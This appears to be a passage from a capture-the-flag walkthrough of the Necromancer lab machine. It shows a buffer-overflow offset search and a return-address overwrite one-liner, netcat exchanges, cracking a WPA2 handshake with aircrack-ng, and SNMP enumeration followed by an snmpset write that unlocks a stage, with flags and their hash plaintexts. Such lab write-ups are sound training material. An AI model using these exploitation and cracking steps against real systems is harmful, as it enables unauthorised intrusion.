 [----------------------------------registers-----------------------------------]
EAX: 0xbffff47d --> 0xf2 
EBX: 0xb7fbdff4 --> 0x160d7c 
ECX: 0x8 
EDX: 0xa13cf2 
ESI: 0x0 
EDI: 0x44414128 ('(AAD')
EBP: 0x413b4141 ('AA;A')
ESP: 0xbffff4f0 ("EAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
EIP: 0x41412941 ('A)AA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41412941
[------------------------------------stack-------------------------------------]
0000| 0xbffff4f0 ("EAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0004| 0xbffff4f4 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0008| 0xbffff4f8 ("AFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0012| 0xbffff4fc ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0016| 0xbffff500 ("AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0020| 0xbffff504 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0024| 0xbffff508 ("2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0028| 0xbffff50c ("AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41412941 in ?? ()
gdb-peda$ pattern_search 
Registers contain pattern buffer:
EIP+0 found at offset: 32
EDI+0 found at offset: 24
EBP+0 found at offset: 28
Registers point to pattern buffer:
[ESP] --> offset 36 - size ~64
Pattern buffer found at:
0xb7fda000 : offset    0 - size  100 (mapped)
0xbffff4cc : offset    0 - size  100 ($sp + -0x24 [-9 dwords])
References to pattern buffer found at:
0xb7fbe444 : 0xb7fda000 (/lib/i386-linux-gnu/i686/cmov/libc-2.13.so)
0xb7fbe448 : 0xb7fda000 (/lib/i386-linux-gnu/i686/cmov/libc-2.13.so)
0xb7fbe44c : 0xb7fda000 (/lib/i386-linux-gnu/i686/cmov/libc-2.13.so)
0xb7fbe450 : 0xb7fda000 (/lib/i386-linux-gnu/i686/cmov/libc-2.13.so)
0xb7fbe454 : 0xb7fda000 (/lib/i386-linux-gnu/i686/cmov/libc-2.13.so)
0xb7fbe458 : 0xb7fda000 (/lib/i386-linux-gnu/i686/cmov/libc-2.13.so)
0xb7fbe45c : 0xb7fda000 (/lib/i386-linux-gnu/i686/cmov/libc-2.13.so)
0xbfffefb4 : 0xb7fda000 ($sp + -0x53c [-335 dwords])
0xbffff04c : 0xb7fda000 ($sp + -0x4a4 [-297 dwords])
0xbffff060 : 0xb7fda000 ($sp + -0x490 [-292 dwords])
0xbffff2d4 : 0xbffff4cc ($sp + -0x21c [-135 dwords])
0xbffff314 : 0xbffff4cc ($sp + -0x1dc [-119 dwords])
0xbffff324 : 0xbffff4cc ($sp + -0x1cc [-115 dwords])
gdb-peda$ quit
root@kali:~# python -c 'print "\x37\x8a\x04\x08" * 9' | ./talisman
You have found a talisman.

The talisman is cold to the touch, and has no words or symbols on it's surface.

Do you want to wear the talisman?  
Nothing happens.
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
You fall to your knees.. weak and weary.
Looking up you can see the spell is still protecting the cave entrance.
The talisman is now almost too hot to touch!
Turning it over you see words now etched into the surface:
flag4{ea50536158db50247e110a6c89fcf3d3}
Chant these words at u31337
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Segmentation fault
```

The fourth flag is **flag4{ea50536158db50247e110a6c89fcf3d3}**
As with flag 1 you've got to find the corresponding plaintext for the md5 hash ea50536158db50247e110a6c89fcf3d3 which ends up being blackmagic.

```
root@kali:~# echo flag4{ea50536158db50247e110a6c89fcf3d3} | nc -u 192.168.56.101 31337
Chant is too long! Nothing happens.
root@kali:~# echo blackmagic | nc -u 192.168.56.101 31337


As you chant the words, a hissing sound echoes from the ice walls.

The blue aura disappears from the cave entrance.

You enter the cave and see that it is dimly lit by torches; shadows dancing against the rock wall as you descend deeper and deeper into the mountain.

You hear high pitched screeches coming from within the cave, and you start to feel a gentle breeze.

The screeches are getting closer, and with it the breeze begins to turn into an ice cold wind.

Suddenly, you are attacked by a swarm of bats!

You aimlessly thrash at the air in front of you!

The bats continue their relentless attack, until.... silence.

Looking around you see no sign of any bats, and no indication of the struggle which had just occurred.

Looking towards one of the torches, you see something on the cave wall.

You walk closer, and notice a pile of mutilated bats lying on the cave floor.  Above them, a word etched in blood on the wall.

/thenecromancerwillabsorbyoursoul

flag5{0766c36577af58e15545f099a3b15e60}
```

Sending the string blackmagic string to the server on port 31337 reveals the next flag and unlocks the next challenge.
The fifth flag is **flag5{0766c36577af58e15545f099a3b15e60}**

<img src="{{site.url}}/assets/necromancer-3.png">

```
root@kali:~# curl -O http://192.168.56.101/thenecromancerwillabsorbyoursoul/necromancer
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 10355  100 10355    0     0  1520k      0 --:--:-- --:--:-- --:--:-- 2022k
root@kali:~# file necromancer 
necromancer: bzip2 compressed data, block size = 900k
root@kali:~# mv necromancer necromancer.bz2
root@kali:~# bunzip2 -d necromancer.bz2
root@kali:~# file necromancer 
necromancer: POSIX tar archive (GNU)
root@kali:~# mv necromancer necromancer.tar
root@kali:~# tar xvf necromancer.tar 
necromancer.cap
root@kali:~# file necromancer.cap 
necromancer.cap: tcpdump capture file (little-endian) - version 2.4 (802.11, capture length 65535)
```

With the next challenge there is a link to a file named necromancer as well as a reference to UDP 161.
If we port scan the necromancer system again we see that UDP 161 is open. Running snmpwalk against the necromancer machine with a few common community string does not return results.

```
root@kali:~# unicornscan -mU -I 192.168.56.101:a;unicornscan -mT -I 192.168.56.101:a
UDP open 192.168.56.101:161  ttl 64
UDP open	            snmp[  161]		from 192.168.56.101  ttl 64 
root@kali:~# snmpwalk -v1 -c public 192.168.56.101
Timeout: No Response from 192.168.56.101
root@kali:~# snmpwalk -v2c -c public 192.168.56.101
Timeout: No Response from 192.168.56.101
root@kali:~# snmpwalk -v1 -c private 192.168.56.101
Timeout: No Response from 192.168.56.101
root@kali:~# snmpwalk -v1 -c private 192.168.56.101
Timeout: No Response from 192.168.56.101
```
After using the file command a few times against the linked file and decompressing we find a packet capture.
Loading the file into wireshark we see it's actually a packet capture of wireless traffic.

<img src="{{site.url}}/assets/necromancer-4.png">

To make analysis easier I proceeded to use airodump to load the packet capture.

```
root@kali:~# airodump-ng -r necromancer.cap 
 CH  0 ][ Elapsed: 0 s ][ 2016-09-19 07:09 ][ Finished reading input file necromancer.cap.


 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 C4:12:F5:0D:5E:95    0        1        5    0  11  54e. WPA2 CCMP   PSK  community

 BSSID              STATION            PWR   Rate    Lost    Frames  Probe

 C4:12:F5:0D:5E:95  E8:50:8B:20:52:75    0    0e- 0e   326      396
```

Looking at the output from airodump we can see one client connected to a wireless network protected by WPA2.
The solution to this challenge is likely we have to recover the WPA password which will be the SNMP community string.

```
root@kali:~# gunzip -d /usr/share/wordlists/rockyou.txt.gz 
root@kali:~# aircrack-ng -w /usr/share/wordlists/rockyou.txt necromancer.cap 
Opening necromancer.cap
Read 2197 packets.

   #  BSSID              ESSID                     Encryption

   1  C4:12:F5:0D:5E:95  community                 WPA (1 handshake)

Choosing first network as target.

Opening necromancer.cap
Reading packets, please wait...
                                 Aircrack-ng 1.2 rc2


                   [00:00:14] 16100 keys tested (1149.34 k/s)


                           KEY FOUND! [ death2all ]


      Master Key     : 7C F8 5B 00 BC B6 AB ED B0 53 F9 94 2D 4D B7 AC 
                       DB FA 53 6F A9 ED D5 68 79 91 84 7B 7E 6E 0F E7 

      Transient Key  : EB 8E 29 CE 8F 13 71 29 AF FF 04 D7 98 4C 32 3C 
                       56 8E 6D 41 55 DD B7 E4 3C 65 9A 18 0B BE A3 B3 
                       C8 9D 7F EE 13 2D 94 3C 3F B7 27 6B 06 53 EB 92 
                       3B 10 A5 B0 FD 1B 10 D4 24 3C B9 D6 AC 23 D5 7D 

      EAPOL HMAC     : F6 E5 E2 12 67 F7 1D DC 08 2B 17 9C 72 42 71 8E 
```

If we use WPA password as the SNMP community string we get a response from the SNMP server as well as a new SNMP community string.
Running snmpwalk with the new community string it reveals more information about the necromancer machine.

```
root@kali:~# snmpwalk -v1 -c death2all 192.168.56.101
iso.3.6.1.2.1.1.1.0 = STRING: "You stand in front of a door."
iso.3.6.1.2.1.1.4.0 = STRING: "The door is Locked. If you choose to defeat me, the door must be Unlocked."
iso.3.6.1.2.1.1.5.0 = STRING: "Fear the Necromancer!"
iso.3.6.1.2.1.1.6.0 = STRING: "Locked - death2allrw!"
End of MIB
root@kali:~# snmpwalk -v2c -c death2all 192.168.56.101
iso.3.6.1.2.1.1.1.0 = STRING: "You stand in front of a door."
iso.3.6.1.2.1.1.4.0 = STRING: "The door is Locked. If you choose to defeat me, the door must be Unlocked."
iso.3.6.1.2.1.1.5.0 = STRING: "Fear the Necromancer!"
iso.3.6.1.2.1.1.6.0 = STRING: "Locked - death2allrw!"
iso.3.6.1.2.1.1.6.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
root@kali:~# snmpwalk -v2c -c death2allrw 192.168.56.101
iso.3.6.1.2.1.1.1.0 = STRING: "You stand in front of a door."
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.255
iso.3.6.1.2.1.1.3.0 = Timeticks: (531103) 1:28:31.03
iso.3.6.1.2.1.1.4.0 = STRING: "The door is Locked. If you choose to defeat me, the door must be Unlocked."
iso.3.6.1.2.1.1.5.0 = STRING: "Fear the Necromancer!"
iso.3.6.1.2.1.1.6.0 = STRING: "Locked - death2allrw!"
```

I proceeded to use metasploit's snmp enumeration module to pull as much information as I can.

```
msf > use auxiliary/scanner/snmp/snmp_enum
msf auxiliary(snmp_enum) > show options 

Module options (auxiliary/scanner/snmp/snmp_enum):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   COMMUNITY  public           yes       SNMP Community String
   RETRIES    1                yes       SNMP Retries
   RHOSTS                      yes       The target address range or CIDR identifier
   RPORT      161              yes       The target port
   THREADS    1                yes       The number of concurrent threads
   TIMEOUT    1                yes       SNMP Timeout
   VERSION    1                yes       SNMP Version <1/2c>

msf auxiliary(snmp_enum) > set -g COMMUNITY death2allrw
COMMUNITY => death2allrw
msf auxiliary(snmp_enum) > set rhosts 192.168.56.101
rhosts => 192.168.56.101
msf auxiliary(snmp_enum) > run 

[+] 192.168.56.101, Connected.

[*] System information:

Host IP                       : 192.168.56.101
Hostname                      : Fear the Necromancer!
Description                   : You stand in front of a door.
Contact                       : The door is Locked. If you choose to defeat me, the door must be Unlocked.
Location                      : Locked - death2allrw!
Uptime snmp                   : 01:38:26.80
Uptime system                 : 01:38:19.57
System date                   : 2016-9-20 08:04:14.0

[*] Network information:

IP forwarding enabled         : no
Default TTL                   : 64
TCP segments received         : 280
TCP segments sent             : 632
TCP segments retrans          : 0
Input datagrams               : 517035
Delivered datagrams           : 381642
Output datagrams              : 381973

[*] Network interfaces:

Interface                     : [ up ] em0
Id                            : 1
Mac Address                   : 00:00:27:3c:17:95
Type                          : ethernet-csmacd
Speed                         : 1000 Mbps
MTU                           : 1500
In octets                     : 10552409
Out octets                    : 871602

Interface                     : [ down ] enc0
Id                            : 2
Mac Address                   : :::::
Type                          : unknown
Speed                         : 0 Mbps
MTU                           : 0
In octets                     : 0
Out octets                    : 0

Interface                     : [ up ] lo0
Id                            : 3
Mac Address                   : :::::
Type                          : softwareLoopback
Speed                         : 0 Mbps
MTU                           : 32768
In octets                     : 32529220
Out octets                    : 32529220

Interface                     : [ up ] pflog0
Id                            : 4
Mac Address                   : :::::
Type                          : unknown
Speed                         : 0 Mbps
MTU                           : 33144
In octets                     : 0
Out octets                    : 46


[*] Network IP:

Id                  IP Address          Netmask             Broadcast           
3                   127.0.0.1           255.0.0.0           0                   
1                   192.168.56.101      255.255.255.0       1                   

[*] Routing information:

Destination         Next hop            Mask                Metric              
0.0.0.0             192.168.56.1        0.0.0.0             1                   
127.0.0.0           127.0.0.1           255.0.0.0           1                   
127.0.0.1           127.0.0.1           255.255.255.255     0                   
192.168.56.0        192.168.56.101      255.255.255.0       0                   
224.0.0.0           127.0.0.1           240.0.0.0           0                   

[*] TCP connections and listening ports:

Local address       Local port          Remote address      Remote port         State               
0.0.0.0             199                 0.0.0.0             0                   listen              

[*] Listening UDP ports:

Local address       Local port          
0.0.0.0             514                 
127.0.0.1           161                 
127.0.0.1           666                 
127.0.0.1           31337               
192.168.56.101       4615                
192.168.56.101       8114                
192.168.56.101       9694                
192.168.56.101       41155               

[*] Storage information:

Description                   : ["Physical memory"]
Device id                     : [#<SNMP::Integer:0xf5dd7fc @value=1>]
Filesystem type               : ["Ram"]
Device unit                   : [#<SNMP::Integer:0xf5cfb5c @value=4096>]
Memory size                   : 495.94 MB
Memory used                   : 88.94 MB

Description                   : ["Real memory"]
Device id                     : [#<SNMP::Integer:0xf5cc0d8 @value=2>]
Filesystem type               : ["Ram"]
Device unit                   : [#<SNMP::Integer:0xf5c6b10 @value=4096>]
Memory size                   : 495.93 MB
Memory used                   : 88.93 MB

Description                   : ["Virtual memory"]
Device id                     : [#<SNMP::Integer:0xf5b7700 @value=3>]
Filesystem type               : ["Virtual Memory"]
Device unit                   : [#<SNMP::Integer:0xf5b6648 @value=4096>]
Memory size                   : 78.09 MB
Memory used                   : 57.14 MB

Description                   : ["Shared virtual memory"]
Device id                     : [#<SNMP::Integer:0xf5a9e98 @value=8>]
Filesystem type               : ["Other"]
Device unit                   : [#<SNMP::Integer:0xf5a878c @value=4096>]
Memory size                   : 0 bytes
Memory used                   : 0 bytes

Description                   : ["Shared real memory"]
Device id                     : [#<SNMP::Integer:0xf5a0fa0 @value=9>]
Filesystem type               : ["Other"]
Device unit                   : [#<SNMP::Integer:0xf59fd44 @value=4096>]
Memory size                   : 0 bytes
Memory used                   : 0 bytes

Description                   : ["Swap space"]
Device id                     : [#<SNMP::Integer:0xf59c658 @value=10>]
Filesystem type               : ["Virtual Memory"]
Device unit                   : [#<SNMP::Integer:0xf587140 @value=4096>]
Memory size                   : 81.14 MB
Memory used                   : 0 bytes

Description                   : ["/"]
Device id                     : [#<SNMP::Integer:0xf57f2ec @value=31>]
Filesystem type               : ["Fixed Disk"]
Device unit                   : [#<SNMP::Integer:0xf57de4c @value=2048>]
Memory size                   : 787.86 MB
Memory used                   : 49.53 MB

Description                   : ["/home"]
Device id                     : [#<SNMP::Integer:0xf5723bc @value=32>]
Filesystem type               : ["Fixed Disk"]
Device unit                   : [#<SNMP::Integer:0xf570d00 @value=2048>]
Memory size                   : 251.65 MB
Memory used                   : 20.00 KB

Description                   : ["/usr"]
Device id                     : [#<SNMP::Integer:0xf561288 @value=33>]
Filesystem type               : ["Fixed Disk"]
Device unit                   : [#<SNMP::Integer:0xf55bd60 @value=2048>]
Memory size                   : 892.86 MB
Memory used                   : 694.72 MB


[*] File system information:

Index                         : 1
Mount point                   : /
Remote mount point            : -
Type                          : BerkeleyFFS
Access                        : 1
Bootable                      : 1

[*] Device information:

Id                  Type                Status              Descr               
196608              Processor           running             <censored>
262145              Network             running             network interface em0
262146              Network             down                network interface enc0
262147              Network             running             network interface lo0
262148              Network             running             network interface pflog0
393216              Disk Storage        unknown             ESDI                
786432              Coprocessor         unknown             Guessing that there's a floating point co-processor

[*] Software components:

Index               Name                
1                   bzip2-1.0.6p7       
2                   libiconv-1.14p3     
3                   gettext-0.19.7      
4                   libffi-3.2.1p0      
5                   python-2.7.11       
6                   pcre-8.38           
7                   libunistring-0.9.6  
8                   libidn-1.32         
9                   libpsl-0.7.1p1      
10                  wget-1.16.3p0       
11                  quirks-2.231        
12                  femail-1.0p1        
13                  femail-chroot-1.0p2 
14                  xz-5.2.2p0          
15                  libxml-2.9.3        
16                  php-5.4.45p2        
17                  net-snmp-5.7.3p6    
18                  sudo-1.8.15         

[*] Processes:

Id                  Status              Name                Path                Parameters          
0                   runnable            swapper             swapper                                 
1                   runnable            init                /sbin/init                              
899                 runnable            sh                  sh                  -c /bin/sh /root/scripts/flag5.sh
1712                runnable            dhclient            dhclient: em0                           
1777                runnable            cleaner             cleaner                                 
2831                runnable            ntpd                ntpd: dns engine                        
3267                runnable            grep                /usr/bin/grep       -i unlocked         
4001                runnable            systq               systq                                   
4606                runnable            getty               /usr/libexec/getty  std.9600 ttyC2      
4834                runnable            softnet             softnet                                 
5826                runnable            ntpd                /usr/sbin/ntpd                          
5844                runnable            httpd               /usr/sbin/httpd                         
5873                runnable            sh                  /bin/sh             /root/scripts/flag6.sh
6652                runnable            crypto              crypto                                  
6808                runnable            sndiod              /usr/bin/sndiod                         
7714                runnable            syslogd             /usr/sbin/syslogd                       
8623                runnable            acpi0               acpi0                                   
8922                runnable            httpd               httpd: logger                           
9487                runnable            idle0               idle0                                   
10107               runnable            cron                /usr/sbin/cron                          
10314               runnable            httpd               httpd: server                           
10350               runnable            aiodoned            aiodoned                                
10691               runnable            dhclient            dhclient: em0 [priv]                    
11086               runnable            httpd               httpd: server                           
13265               runnable            sh                  /bin/sh             /root/scripts/flag5.sh
14197               runnable            usbtask             usbtask                                 
14414               runnable            getty               /usr/libexec/getty  std.9600 ttyC3      
15288               runnable            sndiod              sndiod: helper                          
15996               runnable            httpd               httpd: server                           
16246               runnable            pflogd              pflogd: [priv]                          
17529               runnable            syslogd             syslogd: [priv]                         
18963               runnable            reaper              reaper                                  
19490               running             snmpd               /usr/local/sbin/snmpd-u root -I -ipv6    
21317               runnable            sshd                /usr/sbin/sshd                          
22278               runnable            update              update                                  
22406               running             snmpget             /usr/local/bin/snmpget-v 2c -c  127.0.0.1 .1.3.6.1.2.1.1.6.0
22825               runnable            pflogd              pflogd: [running] -s 160 -i pflog0 -f /var/log/pflog                    
23764               runnable            getty               /usr/libexec/getty  std.9600 ttyC0      
24614               running             zerothread          zerothread                              
24829               runnable            pagedaemon          pagedaemon                              
24867               runnable            getty               /usr/libexec/getty  std.9600 ttyC1      
25555               runnable            ntpd                ntpd: ntp engine                        
26027               runnable            usbatsk             usbatsk                                 
27791               runnable            pfpurge             pfpurge                                 
29661               runnable            systqmp             systqmp                                 
30250               runnable            getty               /usr/libexec/getty  std.9600 ttyC5      


[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Looking at the process listing output, there appears to be a script which is checking the SNMP OID .1.3.6.1.2.1.1.6.0.
Combined with the response which mentioned we need to unlock the door, It appears we need to set the SNMP OID .1.3.6.1.2.1.1.6.0. to "Unlocked"

```
root@kali:~# snmpget -v2c -c death2allrw 192.168.56.101 .1.3.6.1.2.1.1.6.0
iso.3.6.1.2.1.1.6.0 = STRING: "Locked - death2allrw!"
root@kali:~# snmpset -v2c -c death2allrw 192.168.56.101 .1.3.6.1.2.1.1.6.0 s Unlocked
iso.3.6.1.2.1.1.6.0 = STRING: "Unlocked"
root@kali:~# snmpget -v2c -c death2allrw 192.168.56.101 .1.3.6.1.2.1.1.6.0
iso.3.6.1.2.1.1.6.0 = STRING: "flag7{9e5494108d10bbd5f9e7ae52239546c4} - t22"
```

The seventh flag is **flag7{9e5494108d10bbd5f9e7ae52239546c4}**. The plaintext for 9e5494108d10bbd5f9e7ae52239546c4 is demonslayer.
After setting the SNMP OID, the SNMP and HTTP ports are closed but now SSH is now open

```
root@kali:~# unicornscan -mU -I 192.168.56.101:a;unicornscan -mT -I 192.168.56.101:a
TCP open 192.168.56.101:22  ttl 64
TCP open	             ssh[   22]		from 192.168.56.101  ttl 64 
```
